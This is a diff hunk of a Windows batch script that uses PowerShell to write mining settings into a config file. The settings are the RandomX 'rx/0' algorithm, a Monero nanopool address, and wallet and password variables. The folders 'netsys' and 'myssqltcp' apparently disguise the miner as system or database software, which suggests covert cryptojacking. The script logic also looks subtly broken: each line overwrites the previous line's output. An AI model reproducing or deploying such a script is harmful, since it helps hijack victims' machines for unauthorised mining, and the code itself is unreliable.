@@ -296,7 +296,7 @@ if not [%EMAIL%] == [] (
   set "%EMAIL%"
 )
 
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"algo\": *null,', '\"algo\": rx/0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"algo\": *null,', '\"algo\": "rx/0",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"xmr-us-west1.nanopool.org:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
